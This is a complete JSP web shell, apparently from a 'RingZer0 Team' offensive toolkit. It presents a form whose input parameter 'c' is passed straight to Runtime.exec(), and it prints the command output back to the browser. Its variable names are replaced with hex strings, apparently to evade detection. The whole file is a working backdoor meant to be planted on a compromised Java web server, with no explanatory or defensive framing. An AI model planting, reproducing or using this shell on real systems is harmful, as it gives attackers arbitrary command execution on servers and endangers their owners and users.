<%@ page import="java.util.*,java.io.*"%>
<!DOCTYPE html>
 <head>
  <title>Mr.Un1k0d3r RingZer0 Team</title>
 </head>
 <body>
 <style type="text/css">
  body {
   background-color: black;
   color: #65be00;
  }
  
  span {
   color: white;
  }
 </style>
 <form> 
  <input type="text" name="c" /> 
  <input type="submit" value="Run it" /> 
 </form>
 <br />
 <hr />
 <% 
 String _00f67a8862bc35bc57da6fa074 = request.getParameter("c");
 if(_00f67a8862bc35bc57da6fa074 != null) { 
  out.println("Current Command: <span>" + _00f67a8862bc35bc57da6fa074 + "</span><br /><br />"); 
  Runtime _ec16c7 = Runtime.getRuntime();
  Process _3f965c0036e11457688879 = _ec16c7.exec(_00f67a8862bc35bc57da6fa074); 
  OutputStream _17443c15d9 = _3f965c0036e11457688879.getOutputStream(); 
  InputStream _3512e4b93a17 = _3f965c0036e11457688879.getInputStream(); 
  DataInputStream _1aabb79a7e143d = new DataInputStream(_3512e4b93a17); 
  String _9866c17553ec6fc9ae110c = _1aabb79a7e143d.readLine(); 
  while(_9866c17553ec6fc9ae110c != null) { 
   out.println(_9866c17553ec6fc9ae110c + "<br />"); 
   _9866c17553ec6fc9ae110c = _1aabb79a7e143d.readLine(); 
  } 
 } %>
 </body>
</html>
